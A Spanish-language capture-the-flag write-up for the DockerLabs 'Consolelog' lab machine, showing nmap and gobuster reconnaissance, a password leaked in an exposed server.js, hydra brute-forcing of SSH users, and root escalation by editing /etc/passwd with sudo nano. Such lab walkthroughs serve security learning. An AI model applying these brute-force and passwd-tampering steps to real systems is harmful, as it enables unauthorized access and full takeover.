---
title: Consolelog - DockerLabs
categories: [ Linux ]
tags: [DockerLabs]
---

<img src="/assets/img/DLabs/consolelog/consolelog.png" alt="Captura de pantalla de la máquina Consolelog en DockerLabs">

Hoy explotaremos la máquina *Consolelog* de [DockerLabs](https://dockerlabs.es/), de dificultad Fácil. Vamos a inspeccionar la pagina web para conseguir acceso a un usuario y despues vamos a escalar a root 

## Desplegamos la máquina

```bash
➤ sudo bash auto_deploy.sh tproot.tar
[sudo] contraseña para nmc:     

	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  
                                         
				     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```



## Escaneo NMAP

Antes que nada, deberemos hacer un escaneo de puertos con **nmap** para encontrar los puertos abiertos y qué servicios corren en ellos.

```bash
➤ nmap -sV -p- --min-rate=5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:35 CST
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.61 ((Debian))
3000/tcp open  http    Node.js Express framework
5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```



Nos percatamos de que está abierto el puerto **80** con el servicio **http**, el puerto **5000** con el servicio **ssh**.

## Web

Abriremos la pagina web e inspeccionando el codigo nos percatamos que al pulsar el boton **Boton en fase beta**, la consola nos da un token

<img src="/assets/img/DLabs/consolelog/console.png" alt="Captura de pantalla de la máquina Consolelog en DockerLabs">

## Fuzzing

Hacemos fuzzing para encontrar mas directorios

```bash
➤ gobuster dir -u http://172.17.0.2/ -w /snap/seclists/900/Discovery/Web-Content/common.txt -t 50 --add-slash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /snap/seclists/900/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess/           (Status: 403) [Size: 275]
/.hta/                (Status: 403) [Size: 275]
/.htpasswd/           (Status: 403) [Size: 275]
/backend/             (Status: 200) [Size: 1563]
/icons/               (Status: 403) [Size: 275]
/javascript/          (Status: 403) [Size: 275]
/server-status/       (Status: 403) [Size: 275]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```



Nos concentramos en **/backend/**. Al ingresar al directorio */backend/* podemos observar que tenemos diversos archivos.

<img src="/assets/img/DLabs/consolelog/backend.png" alt="Captura de pantalla de la máquina Consolelog en DockerLabs">

Entre los archivos hay uno que se llama *server.js* el cual parece que este servidor escucha peticiones POST en la ruta */recurso/* y devuelve una contraseña si el token proporcionado es correcto.

<img src="/assets/img/DLabs/consolelog/server.png" alt="Captura de pantalla de la máquina Consolelog en DockerLabs">

## Hydra
 
Ya tenemos una password que parece ser funcional. Ejecutamos **hydra** para obtener un usuario.

```bash
➤ hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas -t 50 ssh://172.17.0.2:5000
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-30 22:40:48
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344398 login tries (l:14344398/p:1), ~286888 tries per task
[DATA] attacking ssh://172.17.0.2:5000/
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```



Conseguimos un usuario y ahora nos conectaremos con **ssh** con las credenciales obtenidas

## SSH

```bash
➤ ssh lovely@172.17.0.2 -p 5000
lovely@172.17.0.2's password: 
Linux a3dc06e1fab3 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lovely@a3dc06e1fab3:~$
```



## Escalada de privilegios

Buscamos archivos con le bit **SUID** activado:

```bash
lovely@a3dc06e1fab3:~$ cd /
lovely@a3dc06e1fab3:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/nano
```



Intentamos con **sudo -l**

```bash
lovely@a3dc06e1fab3:/$ sudo -l
Matching Defaults entries for lovely on a3dc06e1fab3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User lovely may run the following commands on a3dc06e1fab3:
    (ALL) NOPASSWD: /usr/bin/nano
```



Con esto en mente revisaremos si solo tenemos al usuario *lovely* o debemos acceder como otro usuario. Revisamos el passwd y podemos observar que hay un usuario más.

```bash
lovely@a3dc06e1fab3:/$ cd /home
lovely@a3dc06e1fab3:/home$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
tester:x:1000:1000::/home/tester:/bin/bash
lovely:x:1001:1001:lovely,,,:/home/lovely:/bin/bash
```



Recordemos que tenemos la capacidad de ejecutar comandos como root usando nano y siendo así podemos editar el archivo passwd y quitarle la x para poder acceder sin credenciales.

```bash
lovely@a3dc06e1fab3:/home$ cd /
lovely@a3dc06e1fab3:/$ ./usr/bin/nano /etc/passwd
```



<img src="/assets/img/DLabs/consolelog/nano.png" alt="Captura de pantalla de la máquina Consolelog en DockerLabs">

Luego de borrar la *x* guardamos los cambios y probamos a cambiar de usuario

```bash
lovely@a3dc06e1fab3:/$ su root
root@a3dc06e1fab3:/# whoami
root
root@a3dc06e1fab3:/#
```



## Acceso ROOT obtenido

¡Máquina comprometida! Te deseo un feliz hackeo.
